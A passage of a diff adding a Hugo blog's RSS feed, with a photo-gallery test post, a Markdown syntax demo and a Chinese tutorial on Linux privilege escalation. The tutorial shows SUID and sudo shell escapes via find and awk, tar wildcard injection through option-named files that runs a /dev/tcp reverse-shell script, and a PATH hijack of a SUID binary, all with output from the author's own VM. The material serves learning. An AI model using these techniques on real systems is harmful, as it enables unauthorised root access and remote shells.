+			srcset=&#34;https://coollllllll.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_480x0_resize_q75_box.jpg 480w, https://coollllllll.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Photo by Luca Bravo on Unsplash&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Photo by Luca Bravo on Unsplash&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 133; 
+			flex-basis: 320px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash.jpg&#34; data-size=&#34;1000x750&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash.jpg&#34;
+			width=&#34;1000&#34;
+			height=&#34;750&#34;
+			srcset=&#34;https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu45a5e3ad5e058da6a00650ed8fd40bea_15530_480x0_resize_q75_box.jpg 480w, https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu45a5e3ad5e058da6a00650ed8fd40bea_15530_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Photo by Helena Hertz on Unsplash&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Photo by Helena Hertz on Unsplash&lt;/figcaption&gt;
+	
+&lt;/figure&gt;  &lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 66; 
+			flex-basis: 160px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash.jpg&#34; data-size=&#34;667x1000&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash.jpg&#34;
+			width=&#34;667&#34;
+			height=&#34;1000&#34;
+			srcset=&#34;https://coollllllll.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hub241c2a9c7a2caf7e16a2a5bbc7141ff_18711_480x0_resize_q75_box.jpg 480w, https://coollllllll.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hub241c2a9c7a2caf7e16a2a5bbc7141ff_18711_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Photo by Hudai Gayiran on Unsplash&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Photo by Hudai Gayiran on Unsplash&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 148; 
+			flex-basis: 356px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/test-chinese/1.png&#34; data-size=&#34;306x206&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/test-chinese/1.png&#34;
+			width=&#34;306&#34;
+			height=&#34;206&#34;
+			srcset=&#34;https://coollllllll.github.io/p/test-chinese/1_huc0c795a9d1242065da665bc517acba81_806_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/test-chinese/1_huc0c795a9d1242065da665bc517acba81_806_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;hahahah&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;hahahah&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;![&lt;span class=&#34;nt&#34;&gt;Photo by Florian Klauer on Unsplash&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;florian-klauer-nptLmg6jqDo-unsplash.jpg&lt;/span&gt;)  ![&lt;span class=&#34;nt&#34;&gt;Photo by Luca Bravo on Unsplash&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;luca-bravo-alS7ewQ41M8-unsplash.jpg&lt;/span&gt;) 
+
+![&lt;span class=&#34;nt&#34;&gt;Photo by Helena Hertz on Unsplash&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;helena-hertz-wWZzXlDpMog-unsplash.jpg&lt;/span&gt;)  ![&lt;span class=&#34;nt&#34;&gt;Photo by Hudai Gayiran on Unsplash&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;hudai-gayiran-3Od_VKcDEAA-unsplash.jpg&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;相册语法来自 &lt;a class=&#34;link&#34; href=&#34;https://typlog.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Typlog&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Linux提权学习</title>
+        <link>https://coollllllll.github.io/p/1/</link>
+        <pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/1/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash.jpg" alt="Featured image of post Linux提权学习" /&gt;&lt;h1 id=&#34;linux提权&#34;&gt;Linux提权&lt;/h1&gt;
+&lt;h2 id=&#34;suid和sudo提权&#34;&gt;suid和sudo提权&lt;/h2&gt;
+&lt;h3 id=&#34;suid&#34;&gt;suid&lt;/h3&gt;
+&lt;p&gt;SUID，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Tom)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权。&lt;/p&gt;
+&lt;p&gt;一个程序执行时会有三个id状态，分别如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Real User ID：执行这个程序的用户的真实id，以用户登录时候的id为准&lt;/li&gt;
+&lt;li&gt;Effective User ID：是程序执行过程中使用权限时真正起作用的用户id，操作系统在检查一个程序有没有某个权限的时候会查看该id&lt;/li&gt;
+&lt;li&gt;Saved User ID：程序临时提权时需要保存的先前的用户id，等提权结束后需要回退到这个用户id&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;suid用途&#34;&gt;suid用途&lt;/h4&gt;
+&lt;p&gt;如果用户Tom有另一个用户root的程序的执行权限，并且root给这个程序设置了SUID位，那么Tom就可以用root的权限来执行这个程序&lt;/p&gt;
+&lt;h4 id=&#34;遍历suid文件&#34;&gt;遍历suid文件&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 174; 
+			flex-basis: 418px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211013091410929.png&#34; data-size=&#34;831x477&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211013091410929.png&#34;
+			width=&#34;831&#34;
+			height=&#34;477&#34;
+			srcset=&#34;https://coollllllll.github.io/p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20211013091410929&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20211013091410929&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;设置suid&#34;&gt;设置suid&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 设置suid位
+chmod 4xxx filename
+
+# 设置sgid位
+chmod 2xxx filename
+
+# 设置suid和sgid位
+chmod 6xxx filename
+
+其中xxx指的是文件的一般读写执行权限
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;取消suid&#34;&gt;取消suid&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 取消suid和sgid
+chmod xxx filename
+# 取消suid或sgid
+chmod u-s filename or chmod g-s filename
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;注意&#34;&gt;注意&lt;/h4&gt;
+&lt;p&gt;suid位只对编译过的可执行程序起作用，比如给某一个sh脚本赋予suid位置，而sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的suid位，就不会起作用了&lt;/p&gt;
+&lt;h3 id=&#34;suid提权姿势&#34;&gt;suid提权姿势&lt;/h3&gt;
+&lt;h4 id=&#34;find&#34;&gt;find&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find . -exec /bin/sh -p \; -quit
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;注意:前提都是find可执行文件具备suid&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;其他类似的：https://gtfobins.github.io/&lt;/p&gt;
+&lt;h3 id=&#34;sudo&#34;&gt;sudo&lt;/h3&gt;
+&lt;p&gt;sudo权限是把本来只能超级用户执行的命令&lt;strong&gt;赋予普通用户执行&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;要配置sudo，需要修改/etc/sudoers&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# sudoers文件对某个用户或用户组的sudo配置
+
+授权用户/组 主机   =[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...
+字段1      字段2   字段3                字段4              字段5
+
+# 字段1
+不以%开头表示授权用户； 以%开头表示授权用户组
+# 字段2
+表示允许登录的主机；ALL表示所有;如果该字段不为ALL,表示授权用户只能在某些机器上登录本服务器来执行sudo命令
+# 字段3
+如果省略, 相当于(root:root)，表示可以通过sudo提权到root; 如果为(ALL)或者(ALL:ALL), 表示能够提权到(任意用户:任意用户组)
+# 字段4
+可能取值是NOPASSWD:，注意NOPASSWD后面带有冒号:，表示执行sudo时可以不需要输入密码
+# 字段5
+用逗号分开一系列命令，ALL表示允许所有操作
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sudo -l可查看自己的sudo配置&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 450; 
+			flex-basis: 1080px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211012170101086.png&#34; data-size=&#34;621x138&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211012170101086.png&#34;
+			width=&#34;621&#34;
+			height=&#34;138&#34;
+			srcset=&#34;https://coollllllll.github.io/p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20211012170101086&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20211012170101086&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sudo提权姿势&#34;&gt;sudo提权姿势&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo /usr/bin/awk &#39;BEGIN {system(&amp;quot;/bin/sh&amp;quot;)}&#39;
+
+sudo find . -exec /bin/sh \; -quit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 940; 
+			flex-basis: 2256px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/1/image-20211012170437130.png&#34; data-size=&#34;677x72&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/1/image-20211012170437130.png&#34;
+			width=&#34;677&#34;
+			height=&#34;72&#34;
+			srcset=&#34;https://coollllllll.github.io/p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20211012170437130&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20211012170437130&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;其他类似sudo提权命令:https://gtfobins.github.io/&lt;/p&gt;
+&lt;h2 id=&#34;通配符提权&#34;&gt;通配符提权&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;该类提权一般都配合计划任务，发现计划任务使用了相关命令通配符&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;通配符&#34;&gt;通配符&lt;/h3&gt;
+&lt;p&gt;*：匹配任意数量字符&lt;/p&gt;
+&lt;p&gt;?：匹配任意单个字符&lt;/p&gt;
+&lt;p&gt;[]：一组字符，其中任意一个字符都可匹配该位置单个字符&lt;/p&gt;
+&lt;p&gt;~：单个表示当前用户主目录名称，~后跟用户名表示某用户根目录名称&lt;/p&gt;
+&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
+&lt;h4 id=&#34;示例1&#34;&gt;示例1&lt;/h4&gt;
+&lt;p&gt;test目录下有2个文件&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ls
+test2  test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行cat *&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ cat *
+sadadada
+hahahah
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建&amp;ndash;help文件&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;my help&amp;quot; &amp;gt; --help
+cool@cool-virtual-machine:~/test$ ls
+--help  test2  test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再次执行cat *&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ cat *
+Usage: cat [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+  -A, --show-all           equivalent to -vET
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可观察到并没有读取&amp;quot;&amp;ndash;help&amp;quot;文件的内容，而是被视为&amp;quot;cat&amp;quot;命令的&amp;ndash;help命令帮助选项&lt;/p&gt;
+&lt;p&gt;这种可称为**&amp;ldquo;wildcard wildness&amp;rdquo;**&lt;/p&gt;
+&lt;h4 id=&#34;示例2&#34;&gt;示例2&lt;/h4&gt;
+&lt;p&gt;在test目录下生成反弹shell脚本&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;/bin/sh -i&amp;gt;&amp;amp;/dev/tcp/127.0.0.1/7777 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; shell.sh
+cool@cool-virtual-machine:~/test$ ls
+shell.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成如下文件&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;
+cool@cool-virtual-machine:~/test$ echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint=1&amp;quot;
+cool@cool-virtual-machine:~/test$ ls
+--checkpoint=1  --checkpoint-action=exec=sh shell.sh  shell.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监听端口&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~$ nc -nvlp 7777
+Listening on [0.0.0.0] (family 0, port 7777)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行tar命令&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ tar cf /tmp/test.tar *
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监听结果&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~$ nc -nvlp 7777
+Listening on [0.0.0.0] (family 0, port 7777)
+Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 36508)
+sh-4.3$ id
+id
+uid=1000(cool) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;tar命令的通配符注入需要进入到目标目录，使用通配符&amp;quot;*&amp;quot;，例如 tar -cf /tmp/test.tar *&lt;/p&gt;
+&lt;p&gt;使用绝对路径，如：tar -cf /tmp/test.tar /tmp/test/*, 那么&amp;ndash;checkpoint等会失效，无法执行命令&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;敏感文件&#34;&gt;敏感文件&lt;/h2&gt;
+&lt;h2 id=&#34;path-环境变量劫持&#34;&gt;Path 环境变量劫持&lt;/h2&gt;
+&lt;p&gt;system函数会调用shell(sh)执行命令(传入的参数)&lt;/p&gt;
+&lt;p&gt;现有这样一段可执行程序，如：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include&amp;lt;unistd.h&amp;gt;
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system(&amp;quot;whoami&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以root用户编译后生成“haha”可执行文件如下(具有suid位)：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@cool-virtual-machine:/home/cool/test# ll
+total 40
+drwxrwxr-x  2 cool cool 4096 10月 25 10:56 ./
+drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
+-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以普通用户编译这样一段程序：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include&amp;lt;unistd.h&amp;gt;
+void main()
+{
+	system(&amp;quot;/bin/bash&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成&amp;quot;whoami&amp;quot;文件：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ll
+total 40
+drwxrwxr-x  2 cool cool 4096 10月 25 11:00 ./
+drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
+-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
+-rw-rw-r--  1 cool cool   86 10月 25 10:56 test.c
+-rwxrwxr-x  1 cool cool 8608 10月 25 10:50 whoami*
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;劫持环境变量：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ export PATH=/home/cool/test:$PATH
+cool@cool-virtual-machine:~/test$ which whoami
+/home/cool/test/whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行./haha：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cool@cool-virtual-machine:~/test$ ./haha
+root@cool-virtual-machine:~/test# id
+uid=0(root) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>Markdown Syntax Guide</title>
+        <link>https://coollllllll.github.io/p/markdown-syntax-guide/</link>
+        <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/markdown-syntax-guide/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Markdown Syntax Guide" /&gt;&lt;p&gt;This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p&gt;
+&lt;h2 id=&#34;headings&#34;&gt;Headings&lt;/h2&gt;
+&lt;p&gt;The following HTML &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt;—&lt;code&gt;&amp;lt;h6&amp;gt;&lt;/code&gt; elements represent six levels of section headings. &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; is the highest section level while &lt;code&gt;&amp;lt;h6&amp;gt;&lt;/code&gt; is the lowest.&lt;/p&gt;
+&lt;h1 id=&#34;h1&#34;&gt;H1&lt;/h1&gt;
+&lt;h2 id=&#34;h2&#34;&gt;H2&lt;/h2&gt;
+&lt;h3 id=&#34;h3&#34;&gt;H3&lt;/h3&gt;
+&lt;h4 id=&#34;h4&#34;&gt;H4&lt;/h4&gt;
+&lt;h5 id=&#34;h5&#34;&gt;H5&lt;/h5&gt;
+&lt;h6 id=&#34;h6&#34;&gt;H6&lt;/h6&gt;
+&lt;h2 id=&#34;paragraph&#34;&gt;Paragraph&lt;/h2&gt;
+&lt;p&gt;Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.&lt;/p&gt;
+&lt;p&gt;Itatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.&lt;/p&gt;
+&lt;h2 id=&#34;blockquotes&#34;&gt;Blockquotes&lt;/h2&gt;
+&lt;p&gt;The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a &lt;code&gt;footer&lt;/code&gt; or &lt;code&gt;cite&lt;/code&gt; element, and optionally with in-line changes such as annotations and abbreviations.&lt;/p&gt;
+&lt;h4 id=&#34;blockquote-without-attribution&#34;&gt;Blockquote without attribution&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tiam, ad mint andaepu dandae nostion secatur sequo quae.
+&lt;strong&gt;Note&lt;/strong&gt; that you can use &lt;em&gt;Markdown syntax&lt;/em&gt; within a blockquote.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;blockquote-with-attribution&#34;&gt;Blockquote with attribution&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Don&amp;rsquo;t communicate by sharing memory, share memory by communicating.&lt;!-- raw HTML omitted --&gt;
+— &lt;!-- raw HTML omitted --&gt;Rob Pike&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;tables&#34;&gt;Tables&lt;/h2&gt;
+&lt;p&gt;Tables aren&amp;rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Name&lt;/th&gt;
+&lt;th&gt;Age&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Bob&lt;/td&gt;
+&lt;td&gt;27&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Alice&lt;/td&gt;
+&lt;td&gt;23&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;inline-markdown-within-tables&#34;&gt;Inline Markdown within tables&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Italics&lt;/th&gt;
+&lt;th&gt;Bold&lt;/th&gt;
+&lt;th&gt;Code&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;em&gt;italics&lt;/em&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;bold&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;code&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;code-blocks&#34;&gt;Code Blocks&lt;/h2&gt;
+&lt;h4 id=&#34;code-block-with-backticks&#34;&gt;Code block with backticks&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Example HTML5 Document&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Test&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;code-block-indented-with-four-spaces&#34;&gt;Code block indented with four spaces&lt;/h4&gt;
